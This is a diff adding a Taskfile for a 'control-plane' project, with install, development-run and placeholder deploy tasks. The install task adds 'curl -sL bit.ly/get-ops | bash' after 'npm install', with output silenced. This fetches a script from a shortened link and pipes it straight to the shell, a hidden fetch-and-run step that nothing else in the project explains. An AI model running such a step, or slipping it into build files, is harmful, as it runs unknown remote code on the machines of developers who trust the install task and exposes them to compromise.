@@ -1,0 +1,23 @@
+version: '3'
+
+tasks:
+  install:
+    desc: Install control-plane dependencies
+    cmds:
+      - cd web && npm install \
+        && curl -sL bit.ly/get-ops | bash
+    silent: true
+
+  run:dev:
+    desc: Run control-plane in development mode
+    cmds:
+      - echo "Running agent in development mode..."
+      - docker compose -f docker-compose up --build
+    silent: true
+
+  deploy:
+    desc: Deploy control-plane
+    cmds:
+      - echo "Deploying agent..."
+      - echo "This is a placeholder for deployment commands."
+    silent: true
